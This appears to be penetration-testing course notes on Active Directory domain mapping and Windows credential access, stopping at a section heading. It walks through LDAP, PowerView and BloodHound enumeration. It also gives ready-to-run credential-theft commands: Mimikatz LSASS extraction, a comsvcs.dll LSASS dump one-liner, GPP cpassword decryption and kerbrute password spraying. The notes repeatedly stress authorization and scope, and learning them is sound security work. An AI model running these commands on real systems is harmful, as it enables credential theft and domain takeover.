title: 9.5.0 Stage 05: Local Privilege Escalation
text: id="stage-05-local-privilege-escalation">9.5.0 Stage 05: Local Privilege Escalation ← Main index | Master Notes | Strategy map | Study methods: Escalate privileges on Linux ; Escalate privileges on Windows Purpose: trace an object the current identity controls into execution by a higher-privileged consumer. Automated output is a candidate list; the procedure must validate effective control, consumer, execution identity, trigger and effect. Task Open Enumerate and validate Linux escalation paths Linux privilege escalation Enumerate and validate Windows escalation paths Windows privilege escalation Fast Linux lookup Linux privilege-escalation cheatsheet Fast Windows lookup Windows privilege-escalation cheatsheet Exit condition: the new identity is verified, its access is re-enumerated, and the exact controlled object, effective permission , privileged consumer, execution identity, trigger and effect are documented.

title: 9.6.1 Active Directory Domain Mapping
text: id="active-directory-domain-mapping">9.6.1 Active Directory Domain Mapping ← Stage index | LDAP/Kerberos baseline | AD cheatsheet | Master Notes | Strategy map | Study methods: Map Active Directory attack paths Prerequisite: one authorized domain identity and a route to the required DC/hosts. Record the source host, exact identity, domain FQDN, DNS server, DC FQDN/IP and time state before interpreting failures. Coverage: mapping only. SPNs , ACLs, sessions and credentials are candidate transitions; ticket requests, directory changes, credential access and remote execution belong to the later Stage 06 procedures. Exit: produce a ranked, manually checked map in the form CONTROLLED IDENTITY → EFFECTIVE RELATIONSHIP → OBJECT/HOST → REACHABLE SERVICE → POSSIBLE NEW ACCESS . <h2

title: 9.6.1.1 AD capability transitions
text: id="ad-capability-transitions">9.6.1.1 AD capability transitions Open scalable SVG | Open PNG <h2

title: 9.6.1.2 Keep four maps, not one tool output
text: id="1-keep-four-maps-not-one-tool-output">9.6.1.2 Keep four maps, not one tool output IDENTITY MAP: USER/COMPUTER -> DIRECT + NESTED GROUPS -> DIRECTORY RIGHTS HOST MAP: COMPUTER -> OS/ROLE -> LOCAL/REMOTE-ACCESS RIGHTS -> SESSIONS ROUTE MAP: SOURCE -> DNS/KDC/DC/HOST -> REQUIRED PORT/SERVICE LEAD MAP: EVIDENCE -> HYPOTHESIS -> MINIMUM VALIDATION -> NEXT BLOCK Authentication , authorization , reachability and session presence are independent. A valid LDAP bind does not prove share access; SMB administration on one host does not prove directory privilege; a session edge does not prove retrievable credentials. <h2

title: 9.6.1.3 Establish identity, domain, DC, DNS and time
text: id="2-establish-identity-domain-dc-dns-and-time">9.6.1.3 Establish identity, domain, DC, DNS and time <h3

title: 9.6.1.3.1 Domain-joined Windows source
text: id="domain-joined-windows-source">9.6.1.3.1 Domain-joined Windows source whoami /all echo %USERDNSDOMAIN% echo %USERDOMAIN% echo %LOGONSERVER% nltest /dsgetdc:DOMAIN nltest /dclist:DOMAIN w32tm /query /status [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.DOMAIN Resolve-DnsName -Type SRV _kerberos._tcp.DOMAIN Decisive output: domain FQDN, DC FQDN/IP, current user SID /groups, DNS SRV answers and a plausible time source. USERDOMAIN can be a NetBIOS label; prefer the DNS domain for LDAP/Kerberos. <h3

title: 9.6.1.3.2 Kali/off-domain source
text: id="kalioff-domain-source">9.6.1.3.2 Kali/off-domain source dig +short SRV _ldap._tcp.dc._msdcs.DOMAIN @DC_IP dig +short SRV _kerberos._tcp.DOMAIN @DC_IP nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName RootDSE is a directory-server metadata object. Reading it can reveal naming contexts even when anonymous subtree searches are denied. Convert corp.example to DC=corp,DC=example ; do not guess the base DN when RootDSE can supply it. <summary

title: 9.6.1.3.2.1 Remote Windows session and double-hop caveat
text: id="variant-9-6-1-3-2-1">9.6.1.3.2.1 Remote Windows session and double-hop caveat whoami /all klist dir \\DC_HOST\SYSVOL A supplied credential may create the remote session without being delegated onward to the DC. If local identity commands work but access to a second host fails, distinguish a WinRM/PowerShell remoting credential-delegation problem from invalid credentials. An interactive RDP session, explicit credentials, /netonly network credentials or an off-domain LDAP client may create a different context; always record which identity is used locally and over the network. <h2

title: 9.6.1.4 Native Windows baseline
text: id="3-native-windows-baseline">9.6.1.4 Native Windows baseline net user /domain net user USER /domain net group /domain net group "Domain Admins" /domain net group "GROUP" /domain net accounts /domain nltest /domain_trusts /all_trusts net view /domain net view \\DC_HOST These commands are broadly available but provide partial views. Expand interesting users and groups individually, trace nested groups rather than assuming memberOf is complete, and retain SIDs when names can collide across domains. <summary

title: 9.6.1.4.1 RSAT ActiveDirectory module, only when installed
text: id="variant-9-6-1-4-1">9.6.1.4.1 RSAT ActiveDirectory module, only when installed Get-Command -Module ActiveDirectory Get-ADDomain Get-ADForest Get-ADDomainController -Filter * Get-ADUser -Filter * -Properties Enabled,Description,MemberOf,ServicePrincipalName,UserPrincipalName,PasswordLastSet,LastLogonDate,AdminCount Get-ADGroup -Filter * -Properties GroupScope,GroupCategory,Members,Description Get-ADGroupMember -Identity 'GROUP' -Recursive Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem,OperatingSystemVersion,ServicePrincipalName,TrustedForDelegation,LastLogonDate Get-ADTrust -Filter * Get-AD* cmdlets require the RSAT ActiveDirectory module. Its absence on a client is normal; use ADSI, LDAP, PowerView or an off-domain client. <h2

title: 9.6.1.5 Built-in ADSI/DirectorySearcher fallback
text: id="4-built-in-adsidirectorysearcher-fallback">9.6.1.5 Built-in ADSI/DirectorySearcher fallback $root = [ADSI]'LDAP://RootDSE' $base = [ADSI]("LDAP://" + $root.defaultNamingContext) $searcher = New-Object System.DirectoryServices.DirectorySearcher($base) $searcher.PageSize = 1000 $searcher.PropertiesToLoad.AddRange(@('samaccountname','userprincipalname','objectsid','memberof','serviceprincipalname','description','useraccountcontrol','pwdlastset','lastlogontimestamp')) $searcher.Filter = '(&(objectCategory=person)(objectClass=user))' $searcher.FindAll() | ForEach-Object { $_.Properties } Change only the filter and requested attributes for another object class: <h3

title: 9.6.1.5.1 Groups
text: id="variant-9-6-1-5-1">9.6.1.5.1 Groups # Groups $searcher.Filter = '(objectCategory=group)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('samaccountname','objectsid','member','grouptype','description')) $searcher.FindAll() | ForEach-Object { $_.Properties } <h3

title: 9.6.1.5.2 Computers
text: id="variant-9-6-1-5-2">9.6.1.5.2 Computers # Computers $searcher.Filter = '(objectCategory=computer)' $searcher.PropertiesToLoad.Clear() $searcher.PropertiesToLoad.AddRange(@('dnshostname','operatingsystem','operatingsystemversion','serviceprincipalname','useraccountcontrol','lastlogontimestamp')) $searcher.FindAll() | ForEach-Object { $_.Properties } PageSize = 1000 asks for paged results; without paging, the server's result-size limit can silently produce an incomplete inventory. LDAP filters are data selection, not proof of access or exploitability. <h2

title: 9.6.1.6 Authenticated LDAP from Kali
text: id="5-authenticated-ldap-from-kali">9.6.1.6 Authenticated LDAP from Kali <h3

title: 9.6.1.6.1 Discover the naming context
text: id="discover-the-naming-context">9.6.1.6.1 Discover the naming context ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName <h3

title: 9.6.1.6.2 Users, groups and computers
text: id="users-groups-and-computers">9.6.1.6.2 Users, groups and computers ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName objectSid userAccountControl memberOf description servicePrincipalName pwdLastSet lastLogonTimestamp adminCount ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=group)' sAMAccountName objectSid member groupType description ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=computer)' dNSHostName operatingSystem operatingSystemVersion servicePrincipalName userAccountControl lastLogonTimestamp <summary

title: 9.6.1.6.2.1 SPNs, trusts and GPO/OU context
text: id="variant-9-6-1-6-2-1">9.6.1.6.2.1 SPNs, trusts and GPO/OU context # SPN-bearing accounts: mapping only; do not request tickets in this block. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' \ sAMAccountName servicePrincipalName memberOf userAccountControl pwdLastSet # Trusted-domain objects ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -b 'DC=DOMAIN,DC=TLD' '(objectClass=trustedDomain)' \ cn securityIdentifier trustDirection trustType trustAttributes # OUs and GPO containers; correlate links before inferring host effect. ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(|(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))' \ distinguishedName displayName name gPLink gPOptions <h3

title: 9.6.1.6.3 LDAP failure router
text: id="ldap-failure-router">9.6.1.6.3 LDAP failure router Result Interpretation Next action Invalid credentials (49) Bind identity/secret/context failed; subcodes may refine the cause Recheck UPN vs DOMAIN\USER , account state and exact secret; do not infer authorization Strong(er) authentication required / confidentiality required Server policy rejects that bind/transport Use the permitted LDAPS/StartTLS or Kerberos/SASL path; do not disable protections Size limit exceeded or suspiciously round count Search is incomplete Add paged results and narrow the base/filter Referral/partial results Search crossed a naming-context boundary Query the referred domain/partition or compatible Global Catalog deliberately Bind succeeds, search empty Wrong base/filter, ACL filtering or genuinely no matches Verify RootDSE base, test a known object and request fewer attributes Works by IP, Kerberos fails Route exists but name/SPN/DNS/time path is wrong Use DC FQDN, AD DNS, correct realm and synchronized time <h2

title: 9.6.1.7 PowerView: convenient manual breadth
text: id="6-powerview-convenient-manual-breadth">9.6.1.7 PowerView: convenient manual breadth Import-Module .\PowerView.ps1 Get-Command -Module PowerView Get-Domain Get-DomainController Get-DomainTrust Get-DomainUser | Select-Object samaccountname,userprincipalname,description,memberof,serviceprincipalname Get-DomainGroup Get-DomainGroupMember -Identity 'GROUP' -Recurse Get-DomainComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof The original PowerSploit repository is archived. Course examples and forks may use legacy aliases such as Get-NetUser , Get-NetGroup , Get-NetComputer or Get-NetDomainTrust . Inspect Get-Command / Get-Help for the exact copy present rather than mixing generations. <h2

title: 9.6.1.8 Shares, SYSVOL and NETLOGON
text: id="7-shares-sysvol-and-netlogon">9.6.1.8 Shares, SYSVOL and NETLOGON <h3

title: 9.6.1.8.1 Inventory, then test the object
text: id="inventory-then-test-the-object">9.6.1.8.1 Inventory, then test the object net view \\DC_HOST dir \\DC_HOST\SYSVOL dir \\DC_HOST\NETLOGON nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' --shares smbclient -L //DC_IP -U 'DOMAIN/USER' smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER' -c 'recurse ON; ls' smbclient //DC_IP/SHARE -U 'DOMAIN/USER' Inside smbclient , use ls , cd , get FILE and a harmless approved put only when write validation is needed. Share listing, share connection, file read and file write are separate permissions. Inspect authorized readable policy/logon/deployment paths for scripts, configurations, backups, connection strings and legacy Group Policy Preferences XML containing cpassword . Selectively retrieve relevant files; do not bulk-copy a share merely because it is readable. A discovered secret returns to the credential-classification procedure. <h2

title: 9.6.1.9 Service accounts and SPNs
text: id="8-service-accounts-and-spns">9.6.1.9 Service accounts and SPNs setspn -Q */* setspn -L ACCOUNT Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,useraccountcontrol,pwdlastset Record account → service class/host/port → groups → password age/encryption/delegation clues → reachable service . An SPN means the account represents a Kerberos service identity; it does not mean the password is weak, the service is reachable or the account is privileged. Ticket acquisition/cracking is Block 11. <h2

title: 9.6.1.10 Directory ACLs and effective control
text: id="9-directory-acls-and-effective-control">9.6.1.10 Directory ACLs and effective control Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } | Select-Object ObjectDN,SecurityIdentifier,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType PowerView normally exposes the trustee as SecurityIdentifier . Resolve that SID and trace controlled direct/nested membership. -ResolveGUIDs resolves operation GUIDs; it does not make every trustee a friendly account name. A blank projected column can mean the selected property is absent, not that an ACE has no trustee. <summary

title: 9.6.1.10.1 Compatible copy that actually emits IdentityReference
text: id="variant-9-6-1-10-1">9.6.1.10.1 Compatible copy that actually emits IdentityReference Use this projection only when inspecting the returned object confirms that the loaded implementation provides IdentityReference . Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } | Select-Object ObjectDN,IdentityReference,ActiveDirectoryRights,ObjectAceType,AceType,IsInherited,InheritanceType If the value is an unresolved SID, resolve it before applying the rule to a controlled principal. Candidate right Possible transition to validate later Missing proof now GenericAll Broad object modification Controlled trustee, target object class, applicable deny/inheritance and useful change GenericWrite / WriteProperty Change one or more writable attributes Exact attribute/object GUID and a transition that consumes it WriteOwner Become owner Ability to change the DACL afterward and use the resulting right WriteDacl Add an ACE Effective write-DACL right, planned narrow ACE and restoration AllExtendedRights / ForceChangePassword Extended operation such as reset where applicable Object class, exact extended right and downstream usefulness Self / validated write Add self/member or another validated attribute where schema permits Correct validated-write GUID and target type GPO/OU control Affect linked computers/users Writable GPO component, effective link/scope, refresh/trigger and target placement An ACE is one rule. Effective access depends on trustee/group nesting, allow/deny semantics, inheritance, object-specific GUIDs and security descriptor scope. Do not perform the modification in this mapping block. <h2

title: 9.6.1.11 Host-access candidates
text: id="10-host-access-candidates">9.6.1.11 Host-access candidates Find-LocalAdminAccess nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares Find-LocalAdminAccess is a broad candidate generator and can be noisy or blocked by firewall/RPC controls. Validate a selected host with the service you may actually use. NetExec's (Pwn3d!) indicates administrative SMB context according to that tool; it does not establish RDP, WinRM, WMI/DCOM or directory rights. RDP, WinRM, SMB/service control and WMI/DCOM each have different ports, services, policies and authorization. <h2

title: 9.6.1.12 Sessions are volatile hints
text: id="11-sessions-are-volatile-hints">9.6.1.12 Sessions are volatile hints Get-NetSession -ComputerName COMPUTER -Verbose Get-NetLoggedon -ComputerName COMPUTER PsLoggedOn.exe \\COMPUTER Get-NetSession relies on workstation/session enumeration APIs that modern Windows may restrict. PsLoggedOn combines Registry profile evidence with NetSessionEnum ; remote Registry access and sufficient rights are relevant, and querying can itself create a network-session entry. Therefore: empty/denied is inconclusive , not proof of no users; a session is a time-sensitive observation, not a durable ACL; a session matters only if the current identity can reach/control that host and a later credential/ticket technique applies; session presence does not prove credentials are resident, accessible or reusable. <h2

title: 9.6.1.13 BloodHound: collect narrowly, rank, then validate
text: id="12-bloodhound-collect-narrowly-rank-then-validate">9.6.1.13 BloodHound: collect narrowly, rank, then validate <h3

title: 9.6.1.13.1 Current SharpHound CE
text: id="current-sharphound-ce">9.6.1.13.1 Current SharpHound CE Low-noise directory baseline that avoids contacting every workstation: .\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip Add host facts only when they can answer the next question: .\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory .\bh --ZipFileName candidate-localgroups.zip .\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --Loop --LoopDuration 00:10:00 --OutputDirectory .\bh --ZipFileName candidate-sessions.zip SharpHound with no collection flag uses its broader default, including directory data plus local-group/session attempts. All performs every supported method; it is not the first response to an unanswered narrow question. Import the output ZIP into a compatible BloodHound CE deployment and verify node/edge counts and ingestion errors. <summary

title: 9.6.1.13.1.1 Collector variants and compatibility
text: id="variant-9-6-1-13-1-1">9.6.1.13.1.1 Collector variants and compatibility # Inspect the actual collector before using copied syntax. .\SharpHound.exe --help # Community Linux collector; flags and output compatibility vary by release. bloodhound-python --help bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip # Legacy/course PowerShell collector; use only with a compatible legacy deployment. Import-Module .\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -OutputDirectory .\bh -ZipFileName legacy.zip Use the collector version intended for the BloodHound deployment. bloodhound-python , legacy SharpHound PowerShell and current SharpHound CE are alternatives with different schemas/features, not interchangeable command spellings. <h3

title: 9.6.1.13.2 Analyze in this order
text: id="analyze-in-this-order">9.6.1.13.2 Analyze in this order Mark only identities/hosts actually controlled. A low-privilege session on a host does not make the host itself fully owned. Inspect the controlled principal's direct and nested group memberships and outbound object-control edges. Inspect reachable computers where it has local admin, RDP, WinRM/DCOM or other applicable rights. Inspect high-value goals and shortest paths only as hypothesis generation. Classify each selected edge: directory/static-ish: group, ACL, GPO, OU, trust; host-derived: local group or user right; volatile: session; route-dependent: the required host/service must be reachable now. Reproduce the minimum important relationship manually before handing it to Block 11 or 12. <h2

title: 9.6.1.14 Candidate ledger and path ranking
text: id="13-candidate-ledger-and-path-ranking">9.6.1.14 Candidate ledger and path ranking ID | CONTROLLED PRINCIPAL | RELATIONSHIP | TARGET | SOURCE EVIDENCE | EFFECTIVE? | ROUTE/SERVICE | VOLATILITY | EXPECTED TRANSITION | MINIMUM VALIDATION | STATUS | NEXT BLOCK Rank candidates by: confidence that the relationship is effective; deterministic value of the resulting identity/access; route and service availability; stability versus volatile session timing; reversibility and impact; number of unsupported assumptions. Prefer a validated readable share/credential clue or direct object right over a multi-edge path built from stale sessions and unreachable hosts. <h2

title: 9.6.1.15 Failure routing
text: id="14-failure-routing">9.6.1.15 Failure routing Symptom Most likely layer Next test DC IP reachable, domain names fail DNS/name layer Query AD DNS SRV/A records; use FQDN; check source resolver Kerberos fails while SMB/LDAP by IP works Name/SPN/time/ KDC route FQDN, realm, clock, UDP/TCP 88 and ticket state Domain identity works locally but not from remote shell to DC Credential delegation/double hop klist , SYSVOL access, explicit/off-domain context LDAP bind succeeds but results are incomplete Search scope/paging/ACL RootDSE base, paging, known-object query, requested attributes Share appears but files deny access Object authorization Enter share and test exact directory/file; separate read from write Find-LocalAdminAccess returns nothing Enumeration limitation or no rights Test one evidence-backed host/service manually Session enumeration is empty/denied API/rights/firewall/time limitation Treat inconclusive; retry only where host access/value supports it BloodHound path exists but host is unreachable Route/service layer Move to Stage 07 before identity attacks BloodHound import is empty/odd Collection/schema/ingest issue Inspect collector logs/ZIP, domain/DNS, method and version compatibility ACL appears powerful but cannot be tied to current user Trustee/nesting/scope problem Resolve SID, nested groups, deny/inheritance and target object GUID <h2

title: 9.6.1.16 Handoffs
text: id="15-handoffs">9.6.1.16 Handoffs SPN, roastable/no-preauth candidate, useful ACL/GPO right, readable secret or privileged-host credential opportunity → identity transitions and object control , credential access , or object control . Password/hash/ticket plus validated host authorization → lateral movement . Required internal host/service unreachable → pivoting and tunneling . Any new identity, host, route, subnet or domain → repeat the relevant mapping branches. <h2

title: 9.6.1.17 Tooling for this section
text: id="tooling-for-this-section">9.6.1.17 Tooling for this section Tool Choose it when Requirements Baseline Decisive output Failure cue whoami , net , nltest , setspn , DNS/time tools Always on a domain Windows source Domain context; command availability varies Sections 2–3 and 8 Exact identity/domain/DC/group/SPN facts Partial output; use LDAP/ADSI for breadth ADSI/DirectorySearcher RSAT/PowerView is absent Windows PowerShell/.NET and DC reachability Section 4 Paged objects with requested attributes 1000-ish limit/empty output: paging, base, filter or rights ldapsearch Off-domain/raw LDAP control is useful DC FQDN/IP, base DN, credentials for subtree queries Section 5 Successful bind and complete paged results Error 49, stronger auth, referral or size limit PowerView Fast manual AD relationship queries Known script/version and Windows PowerShell Section 6 Named object/group/ACL/host candidates Archived/fork syntax and blocked APIs require native fallback NetExec Validate SMB identity, shares or selected admin candidate Kali, route to service, credentials nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares Auth line, share rights, optional SMB admin marker SMB result does not prove other protocols smbclient Manually inspect a specific share/object SMB route and credentials smbclient //TARGET/SHARE -U 'DOMAIN/USER' Exact list/read/write result Listing and file access can differ PsLoggedOn Check one justified host for users Windows binary; remote Registry/session access PsLoggedOn.exe \\COMPUTER Local-profile/network-session entries Access/Remote Registry limitations; query adds an artifact SharpHound CE + BloodHound CE Graph directory/host relationships Compatible collector/deployment, DNS/DC route, authorized collection SharpHound.exe --CollectionMethods DCOnly ... Ingested nodes/edges and candidate paths Collection errors, stale sessions, incompatible schema bloodhound-python / LDAPDomainDump Linux-side fallback/reporting Kali packages, LDAP/DNS route, credentials, compatible output expectations Inspect --help ; use only the needed collection/report Directory relationships/HTML or BloodHound output Feature/schema differences from SharpHound CE <h2

title: 9.6.1.18 Kerbrute — confirm candidate names before password testing
text: id="kerbrute--confirm-candidate-names-before-password-testing">9.6.1.18 Kerbrute — confirm candidate names before password testing Use with the real domain and reachable KDC. Names generated from emails/wordlists remain candidates until verified. <h3

title: 9.6.1.18.1 kerbrute userenum -d DOMAIN --dc DC_IP --delay 1000 -o valid-users.txt users.txt
text: id="variant-9-6-1-18-1">9.6.1.18.1 kerbrute userenum -d DOMAIN --dc DC_IP --delay 1000 -o valid-users.txt users.txt kerbrute userenum -d DOMAIN --dc DC_IP --delay 1000 -o valid-users.txt users.txt <h3

title: 9.6.1.18.2 A separate password test, only after reading lockout policy and attempt history
text: id="variant-9-6-1-18-2">9.6.1.18.2 A separate password test, only after reading lockout policy and attempt history # A separate password test, only after reading lockout policy and attempt history kerbrute passwordspray -d DOMAIN --dc DC_IP --delay 1000 --safe \ users.txt 'PASSWORD' Read: a valid principal is not a valid password or host access. Password pre-auth failures can count toward lockout; --safe stops on a reported lock but does not guarantee that no lockout occurs. Confirm a reported login with the relevant SMB/WinRM/LDAP client and keep the account scope explicit. DNS, time and a correct realm remain prerequisites. Sources: upstream 1 . <h2

title: 9.6.1.19 RustHound-CE — a cross-platform BloodHound collector
text: id="rusthound-ce--a-cross-platform-bloodhound-collector">9.6.1.19 RustHound-CE — a cross-platform BloodHound collector Use a compatible RustHound-CE build when collecting directory relationships from Linux or when a SharpHound binary is unsuitable. CE output belongs in BloodHound CE, not Legacy. <h3

title: 9.6.1.19.1 rusthound-ce -d DOMAIN -u 'USER@DOMAIN' -p 'PASSWORD' -f DC_HOST -z
text: id="variant-9-6-1-19-1">9.6.1.19.1 rusthound-ce -d DOMAIN -u 'USER@DOMAIN' -p 'PASSWORD' -f DC_HOST -z rusthound-ce -d DOMAIN -u 'USER@DOMAIN' -p 'PASSWORD' -f DC_HOST -z <h3

title: 9.6.1.19.2 When the directory requires LDAPS and the TLS/name prerequisites are met
text: id="variant-9-6-1-19-2">9.6.1.19.2 When the directory requires LDAPS and the TLS/name prerequisites are met # When the directory requires LDAPS and the TLS/name prerequisites are met rusthound-ce -d DOMAIN -u 'USER@DOMAIN' -p 'PASSWORD' -f DC_HOST --ldaps -z Read: import the generated archive, identify the exact useful edge and verify its underlying permission or host access. Directory collection does not establish a live privileged session on a workstation. LDAP/TLS, DNS or credential errors must be repaired before treating an incomplete graph as evidence of no path. Sources: upstream 1 . <h2

title: 9.6.1.20 GPP cpassword — recover a candidate from readable SYSVOL XML
text: id="gpp-cpassword--recover-a-candidate-from-readable-sysvol-xml">9.6.1.20 GPP cpassword — recover a candidate from readable SYSVOL XML Use when an accessible preference XML contains a cpassword attribute. Search the SYSVOL files actually read/downloaded with the accepted account. grep -Rni 'cpassword' ./sysvol gpp-decrypt 'C_PASSWORD' Read: keep the XML's username, host/policy scope and path beside the recovered value. Old preference files can contain stale credentials. Validate the matching account on a relevant service; a decrypted string is not proof of current domain or local-admin access. A modern domain need not contain these older preference secrets. Sources: upstream 1 . <h2

title: 9.6.1.21 Kerberos clock skew — compare UTC and use a working time source
text: id="kerberos-clock-skew--compare-utc-and-use-a-working-time-source">9.6.1.21 Kerberos clock skew — compare UTC and use a working time source Use when tickets fail with a skew error or the DC/workstation clock comparison is inconsistent. A timezone label is not the UTC clock value. <h3

title: 9.6.1.21.1 date -u
text: id="variant-9-6-1-21-1">9.6.1.21.1 date -u date -u nmap -Pn -p 445 --script smb2-time DC_IP <h3

title: 9.6.1.21.2 If this DC is a confirmed reachable NTP source, correct the attack workstation
text: id="variant-9-6-1-21-2">9.6.1.21.2 If this DC is a confirmed reachable NTP source, correct the attack workstation # If this DC is a confirmed reachable NTP source, correct the attack workstation sudo ntpdate -u DC_IP date -u Read: retry the same ticket/service request after verifying the actual UTC difference. If the clock jumps back, identify the competing host/VM/time-sync source instead of repeatedly changing timezone settings. NTP silence can be filtering or an unavailable time service; it is not evidence that the KDC's displayed time was wrong. Sources: upstream 1 · upstream 2 . <h2

title: 9.6.2 Windows and Domain Credential Access
text: id="windows-and-domain-credential-access">9.6.2 Windows and Domain Credential Access ← Stage index | Domain mapping | Credential handling | AD cheatsheet | Strategy map | Study methods: Recover and use authentication material ; Gain a more useful domain identity Prerequisite: an already authorized host/session and the exact privilege required by the selected source. Do not collect everything by default. Decision: CURRENT IDENTITY → SOURCE → REQUIRED PRIVILEGE/PROTECTION → ARTIFACT TYPE → COMPATIBLE NEXT USE . Exit: classify each result as password, NT hash, AES key, ticket, DPAPI material, cached verifier or local/domain secret; protect it in private records and re-enumerate only through compatible authentication . <h2

title: 9.6.2.1 Select the source before the tool
text: id="1-select-the-source-before-the-tool">9.6.2.1 Select the source before the tool Source What it can contain Typical prerequisite Result is not automatically Current ticket cache TGTs and service tickets for the current logon session Current user; other LUIDs normally require elevation A password, NT hash or authorization to every service LSASS memory/dump Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type Administrator/SYSTEM, suitable debug/dump access, compatible architecture Guaranteed cleartext or every user's reusable secret SAM + SYSTEM Local account password hashes Administrator/SYSTEM/backup-capable access to matched hives Domain-account material SECURITY + SYSTEM LSA secrets, service/machine secrets, cached domain verifiers Administrator/SYSTEM/backup-capable access to matched hives Directly passable cached-domain hashes Credential Manager/DPAPI Targeted saved credentials and protected application data Suitable user/machine context plus master-key material Plaintext merely because a blob/file is readable NTDS + SYSTEM Domain account hashes/keys from a DC database DC-level file access and matched boot-key material Ordinary member-server admin access DRS replication Selected domain-account secrets Effective replication rights at the domain root Local admin, DC service access or Domain Users membership <h2

title: 9.6.2.2 Establish privilege and protection state
text: id="2-establish-privilege-and-protection-state">9.6.2.2 Establish privilege and protection state whoami /all tasklist /fi "imagename eq lsass.exe" reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus Interpretation: membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process; SeDebugPrivilege must be present and usable for common live-process access; a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter; LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS; EDR/AV can block a tool or dump path without proving the underlying credential source is empty. An access-denied or empty result disproves only that method in the current context. <h2

title: 9.6.2.3 Inspect tickets before invasive collection
text: id="3-inspect-tickets-before-invasive-collection">9.6.2.3 Inspect tickets before invasive collection klist klist tgt klist sessions When privileges permit inspecting another logon session: klist -li 0xLUID tickets klist -li 0xLUID tgt Rubeus.exe triage Rubeus.exe dump /luid:0xLUID /nowrap Do not use klist purge during triage. It destroys cached tickets and can break the current session. Interpret exported tickets using Kerberos and identity transitions . <h2

title: 9.6.2.4 LSASS: live logon-session material
text: id="4-lsass-live-logon-session-material">9.6.2.4 LSASS: live logon-session material <h3

title: 9.6.2.4.1 Direct Mimikatz access
text: id="direct-mimikatz-access">9.6.2.4.1 Direct Mimikatz access mimikatz.exe privilege::debug sekurlsa::logonpasswords sekurlsa::tickets Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with Password : (null) is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext. <h3

title: 9.6.2.4.2 Dump first, parse offline
text: id="dump-first-parse-offline">9.6.2.4.2 Dump first, parse offline Built-in comsvcs.dll method from an elevated command prompt: for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full Sysinternals ProcDump alternative: procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp Parse with a compatible Mimikatz build: mimikatz.exe sekurlsa::minidump C:\Path\To\lsass.dmp sekurlsa::logonpasswords sekurlsa::tickets Common failures: dump creation denied: token/protection/EDR or process-access prerequisite failed; ProcessorArchitecture mismatch: use compatible x64/x86 tooling; OS major-version mismatch: parse with a compatible build/environment; dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents. LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective. <h2

title: 9.6.2.5 SAM and SYSTEM: local identities
